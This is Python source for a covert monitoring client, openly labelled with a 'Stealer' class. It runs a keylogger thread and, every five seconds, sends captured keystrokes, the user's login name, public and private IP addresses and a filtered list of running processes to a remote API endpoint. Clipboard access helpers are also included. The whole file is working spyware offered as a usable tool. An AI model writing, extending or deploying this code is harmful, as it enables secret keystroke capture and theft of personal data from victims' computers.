
#//                                                                                        
#!                                      import
#//                                                                                        
import asyncio
import aiohttp

import os
import socket
import psutil
import pyperclip as clipboard
import subprocess
import threading

from z_logger import Keylogger

from states import (

    Codes,
    Commands
)

from typing import Any

#//                                                                                        
#!                              init keylogger and blacklist
#//                                                                                        
keylogger = Keylogger(path = "", debug_state = False) #! init keylogger

blacklist = [ #! blacklist of backgroud software that are not important

    "AggregatorHost.exe",
    "ApplicationFrameHost.exe",
    "CefSharp.BrowserSubprocess.exe",
    "CompPkgSrv.exe",
    "Corsair.Service.CpuIdRemote64.exe",
    "Corsair.Service.exe",
    "CorsairCpuIdService.exe",
    "CorsairDeviceControlService.exe",
    "GameManagerService.exe",
    "HPPrintScanDoctorService.exe",
    "MpDefenderCoreService.exe",
    "MsMpEng.exe",
    "NVDisplay.Container.exe",
    "NisSrv.exe",
    "OfficeClickToRun.exe",
    "OpenConsole.exe",
    "PhoneExperienceHost.exe",
    "RazerCentralService.exe",
    "Registry",
    "RuntimeBroker.exe",
    "RzAppManager",
    "RzBTLEManager",
    "RzChromaConnectManager",
    "RzChromaConnectServer",
    "RzChromaStreamServer.exe",
    "RzDeviceManager",
    "RzDiagnostic",
    "RzIoTDeviceManager",
    "RzSDKServer.exe",
    "RzSDKService.exe",
    "RzSmartlightingDeviceManager",
    "RzTHX0555.exe",
    "SearchApp.exe",
    "SearchIndexer.exe",
    "SecurityHealthService.exe",
    "ShellExperienceHost.exe",
    "StartMenuExperienceHost.exe",
    "System",
    "System Idle Process",
    "TextInputHost.exe",
    "UserOOBEBroker.exe",
    "VSHelper.exe",
    "VSSrv.exe",
    "Video.UI.exe",
    "WmiApSrv.exe",
    "WmiPrvSE.exe",
    "YourPhoneAppProxy.exe",
    "audiodg.exe",
    "backgroundTaskHost.exe",
    "conhost.exe",
    "crashpad_handler.exe",
    "csrss.exe",
    "ctfmon.exe",
    "dasHost.exe",
    "dllhost.exe",
    "dwm.exe",
    "fontdrvhost.exe",
    "gamingservices.exe",
    "gamingservicesnet.exe",
    "iCUEDevicePluginHost.exe",
    "iCUEUpdateService.exe",
    "lsass.exe",
    "msedge.exe",
    "nvcontainer.exe",
    "pet.exe",
    "pwahelper.exe",
    "services.exe",
    "sihost.exe",
    "smss.exe",
    "spoolsv.exe",
    "steamservice.exe",
    "steamwebhelper.exe",
    "svchost.exe",
    "taskhostw.exe",
    "tasklist.exe",
    "vgtray.exe",
    "vmcompute.exe",
    "warp-svc.exe",
    "wininit.exe",
    "winlogon.exe",
    "winrtutil32.exe",
    "sppsvc.exe",
    "MoUsoCoreWorker.exe",
    "Razer Synapse Service Process.exe",
    "Razer Synapse Service.exe",
    "Razer Central.exe"
]

whitelist = [""] #todo fill whitelist

#//                                                                                        
#!                              Stealer Functions
#//                                                                                        
class Stealer:

    async def get_public_ip():

        async with aiohttp.ClientSession() as session:

            async with session.get("https://api64.ipify.org") as response:

                public_ip = await response.text()

                return public_ip
            
    async def get_private_ip():

        private_ip = socket.gethostbyname(socket.gethostname())
    
        return private_ip

    async def get_drives():

        partitions = psutil.disk_partitions()

        drives = [partition.device for partition in partitions]

        return drives
    
    async def get_clipboard():

        data = clipboard.paste()

        if type(data) == str:

            return data
        
        else:

            return "Error"
        
    async def paste_clipboard(text: str):

        clipboard.copy(text)

    async def get_running_apps() -> list:
    
        try:
            
            output = subprocess.check_output(

                ["tasklist", "/fo", "csv", "/nh"],
                text = True,
                encoding = "cp850",
                creationflags = subprocess.CREATE_NO_WINDOW
            )

            
            programs = []

            for line in output.splitlines():

                if line.strip():

                    process_name = line.split('","')[0].strip('"')
                    programs.append(process_name)

            return sorted(list(set(programs)))

        except subprocess.CalledProcessError as tasklist_error:

            print(f"Tasklist Error: {tasklist_error}")

            return ["Error"]
        
        except Exception as error:

            print(f"Error: {error}")

            return ["Error"]
        
    @staticmethod
    async def filter_running_apps(running_apps: list) -> list:

        global blacklist

        filtered_apps = []

        for app in running_apps:

            if app in blacklist:

                continue

            else:

                filtered_apps.append(app)

        return filtered_apps

#//                                                                                        
#!                                      Mainclass
#//                                                                                        
class ALA:

    #agl ____init____
    def __init__(self):

        #? self.url = "https://mcdb.zisia13.com/ALA"
        self.url = "http://localhost:8000/api"
        self.header = {"Content-Type": "application/json"}
        self.login_name = os.getlogin()

    #agl ____json_method____
    def process_json(self, command: str, data: Any) -> tuple: #! insert values into json

        json = {

            "command" : command,

            "data": {

                "message" : data,
            },

            "login" : {

                "username" : "testusername",
                "password" : "testpassword",
            },

            "authorization" : {

                "channel_id" : "testchannel",
                "key" : "testkey"
            }
        }

        return json
    
    #agl ____api_methods___
    async def post_request(self): #! example of post request

        async with aiohttp.ClientSession() as session:

            async with session.post(self.url, json = self.process_json(command = "data", data = "hello"), headers = {"Content-Type": "application/json"}) as response:

                #// response_data = await response.json()

                if response.status != 200:

                    print(f"Server answer bad: {response.status}")

                else:

                    print("Success")

    async def get_request(self): #! example of get request

        async with aiohttp.ClientSession() as session:

            async with session.get(self.url) as response:

                print(f"GET-Response: {await response.text()}")

    async def send_online_status(self) -> None: #! send online status

        async with aiohttp.ClientSession() as session:

            async with session.post(
                
                self.url, 
                json = self.process_json(command = Commands.online_status, data = f"{Codes.online},{self.login_name}"),
                headers = self.header) as response:

                return None
            
    async def send_data(self, command: str, data: Any) -> None: #! send data

        async with aiohttp.ClientSession() as session:

            async with session.post(
                
                self.url, 
                json = self.process_json(command = command, data = data),
                headers = self.header) as response:

                return None

    #agl ____Start____
    async def ala(self): #! Mainloop (execute all)

        keylogger_thread = threading.Thread(target = keylogger.start, daemon = True) #! start a thread 
        keylogger_thread.start() #! start keylogger

        while True:

            try:
            
                #agl ____send_online_status____
                await self.send_online_status()

                #agl ____send_IP_adresses____
                public_ip = await Stealer.get_public_ip()
                private_ip = await Stealer.get_private_ip()

                await self.send_data(command = Commands.public_ip, data = public_ip)
                await self.send_data(command = Commands.private_ip, data = private_ip)

                #agl ____running_apps____
                unfiltered_running_apps = await Stealer.get_running_apps() #! get raw running apps
            
                filtered_running_apps = await Stealer.filter_running_apps(unfiltered_running_apps) #! filter running apps

                await self.send_data(command = Commands.running_apps, data = filtered_running_apps) #! send running apps to server

                for app in filtered_running_apps:
            
                    print(app)

                #agl ____keylogger____
                keylogger.build_data()
                keylogger_data = keylogger.get_built_data()
                #? print(keylogger_data)
                keylogger.clear_data()

                await self.send_data(command = Commands.keylogger_data, data = keylogger_data) #! send data to server

            except Exception as loop_error:
                
                print(loop_error)

            #agl ____timeout____
            await asyncio.sleep(5)

    def run(self): #! Run Mainloop

        asyncio.run(self.ala())

#//                                                                                        
#!                                      Start
#//                                                                                        
ala = ALA() #! create object

ala.run() #! run software
